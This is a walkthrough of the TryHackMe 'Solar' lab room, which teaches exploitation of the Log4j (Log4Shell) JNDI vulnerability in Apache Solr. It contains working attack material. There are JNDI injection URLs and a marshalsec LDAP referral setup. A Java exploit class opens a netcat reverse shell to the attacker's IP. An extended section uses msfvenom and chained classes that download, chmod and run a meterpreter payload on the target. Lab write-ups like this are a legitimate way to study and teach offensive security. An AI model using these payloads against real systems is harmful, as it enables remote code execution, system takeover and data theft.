# Introduction
This page documents the walkthrough of [Solar, a TryHackMe room](https://tryhackme.com/room/solar) designed to teach the 2021 Log4J vulnerability. This walkthrough is solely used for personal learning.<br>
*Read this walkthrough in `light` mode for better visibility due to screenshots!*

# Reconnaisance
1) **What service is running on port 8983? (Just the name of the software)**<br>
To identify the service running on port 8983, we can execute `nmap -sC -sV -p8983 10.10.58.249`

# Discovery
2) **Take a close look at the first page visible when navigating to [`**http://10.10.58.249:8983**`](http://10.10.58.249:8983/). You should be able to see clear indicators that log4j is in use within the application for logging activity. What is the `-Dsolr.log.dir` argument set to, displayed on the front page?**<br>

<br>

3) **Download the attached files (accessible in the top-right of this task) see some _example_ log files within Solr. Explore each file, if just to get a feel for what is displayed in what log.Â One file has a significant number of `INFO` entries showing repeated requests to one specific URL endpoint. Which file includes contains this repeated entry? (Just the filename itself, no path needed)**<br>

Looking at solr.log, we can identify the INFO entries.

4) **What "path" or URL endpoint is indicated in these repeated entries?**<br>
Entries with `/admin/cores` are repeated multiple times
![](/screenshots/log4j/Pasted%20image%2020220303011610.png)

5) **Viewing these log entries, what field name indicates some data entrypoint that you as a user could control? (Just the field name)**<br>
Similarly, the `params` field indicate some possible data entry point.

# Proof of Concept
To obtain a proof of concept, we can attempt to use JNDI to connect back to our attacker machine using the below syntax
`http://10.10.58.249:8983/solr/admin/cores?foo=${jndi:ldap://10.9.2.195:9999}`
![](/screenshots/log4j/Pasted%20image%2020220303012201.png)

OR using `curl`
*notice the { escapes using \ and single-quotes usage*
Looking back at our netcat listener, we see that a connection was made.

# Exploitation
For the exploitation portion, we can use this [marshalsec utility](https://github.com/mbechler/marshalsec) which provides an LDAP Server.

Install this package using maven, `mvn clean package -DskipTests`.

After the package is installed, start the LDAP referral server using `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"`
![](/screenshots/log4j/Pasted%20image%2020220303013226.png)
This command listens on port 1389 and redirects to port 8000 where we will have our exploit class ready.

**Exploit.java (exploit class)**
```java
public class Exploit{
	static {
		try {
			java.lang.RunTime.getRunTime().exec("nc -e /bin/bash 10.9.2.195 9999");
		} catch (Exception e){
			e.printStackTrace();
		}

	}
}
```

Compile exploit class using `javac Exploit.java -source 8 -target 8`. It is important to specify the source and target despite the room saying not to. I find that, without specifying, I wasn't able to get the reverse shell payload to execute.
![](/screenshots/log4j/Pasted%20image%2020220303014623.png)

Now, host a python http server on port 8000 on the same directory that contains the Exploit class. *remember earlier we mentioned that the LDAP server listens on port 1389 and redirects to port 8000, hence it is important to start the http server on port 8000*
![](/screenshots/log4j/Pasted%20image%2020220303013720.png)

Now, start your netcat listener to catch a shell.
![](/screenshots/log4j/Pasted%20image%2020220303013832.png)

Finally, trigger the exploit using the JNDI syntax (changing our destination port to 1389) `http://10.10.58.249:8983/solr/admin/cores?foo=${jndi:ldap://10.9.2.195:1389/Exploit}`
![](/screenshots/log4j/Pasted%20image%2020220303015119.png)

Looking back at our netcat listener, we have a shell!
![](/screenshots/log4j/Pasted%20image%2020220303014726.png)

## A high-level overview
JNDI payload -> LDAP Server (port 1389) -> HTTP Server (8000), runs exploit class -> Reverse shell (port 9999).


# Going Beyond - Obtaining a Meterpreter Shell
In the Solar Room, we were not taught how to obtain a meterpreter shell. However I believe there is a learning point here. Hence, I am going to document the steps to obtaining a meterpreter shell via Log4J.

First, create your meterpreter payload using msfvenom 
`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.9.2.195 LPORT=9999 -f elf > meterpreter_shell.elf`. (Create it in your http server for easier accessibility)

Now, the question is where should we download our binary?
Looking at the Solr web application on port 8983, we can see a possible writable directory for the solr user (`/var/solr/data`). *If this fails, we could also try `/tmp`.* 
![](/screenshots/log4j/Pasted%20image%2020220303024609.png)

Change Exploit.java to the code below. This downloads our meterpreter payload to the /var/solr/data directory instead of using netcat for a reverse shell.
**[UPDATED] Exploit.java (exploit class)**
```java
public class Exploit{
	static {
		try {
			java.lang.RunTime.getRunTime().exec("curl http://10.9.2.195:8000/meterpreter_shell.elf -o /var/solr/data/payload.elf");
		} catch (Exception e){
			e.printStackTrace();
		}
	}
}
```

Then, compile the exploit class again.
![](/screenshots/log4j/Pasted%20image%2020220303020157.png)

Run `msfconsole` and set the necessary parameters for our listener.
![](/screenshots/log4j/Pasted%20image%2020220303020324.png)

Executing the JNDI payload again, we see that the exploit class runs and downloads our meterpreter payload. The payload is now in the target system. Now, we have to execute the binary remotely. 
![](/screenshots/log4j/Pasted%20image%2020220303020410.png)

Create another class to execute the payload. This class changes the permission of our meterpreter payload which allows executions.<br>
**run_meterpreter_payload.java**
```java
public class Exploit{
	static {
		try {
			java.lang.RunTime.getRunTime().exec("chmod +x /var/solr/data/payload.elf");
		} catch (Exception e){
			e.printStackTrace();
		}
	}
}
```

Compile the run class.
![](/screenshots/log4j/Pasted%20image%2020220303020727.png)

Now, we have to restart our LDAP Server with a different parameter - calling our Run class instead of the Exploit class.
`java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.9.2.195:8000/#run_meterpreter_payload"`
![](/screenshots/log4j/Pasted%20image%2020220303020903.png)

Run the JNDI payload, changing the target class. After this class executes, the permissions of the downloaded binary should have been changed.
`http://10.10.58.249:8983/solr/admin/cores?foo=${jndi:ldap://10.9.2.195:1389/run_meterpreter_payload}`
![](/screenshots/log4j/Pasted%20image%2020220303024424.png)


After the payload's file permissions is changed to allow execution, we can proceed to run the malicious payload using the below class.<br>
**[UPDATED] run_meterpreter_payload.java**
```java
public class Exploit{
	static {
		try {
			java.lang.RunTime.getRunTime().exec("/var/solr/data/payload.elf");
		} catch (Exception e){
			e.printStackTrace();
		}
	}
}
```

After compiling it, we proceeded to run the JNDI payload. 
`http://10.10.58.249:8983/solr/admin/cores?foo=${jndi:ldap://10.9.2.195:1389/run_meterpreter_payload}`
![](/screenshots/log4j/Pasted%20image%2020220303024359.png)


Looking back at our meterpreter listener, we see a meterpreter session has been opened.

## A high-level overview
1) JNDI payload -> JNDI Server -> HTTP Server -> Exploit.class (downloads meterpreter payload).<br>
2) Create new class to change permissions of payload. Also, change parameters of LDAP Server to redirect to new class now (instead of Exploit.class).<br>
3) JNDI payload -> JNDI Server -> HTTP Server -> run_meterpreter_payload.class (change permissions of payload to allow for execution).<br>
4) Change java rce to execute the payload, instead of changing permissions.<br>
5) JNDI payload -> JNDI Server -> HTTP Server -> run_meterpreter_payload.class (execute the payload).<br>
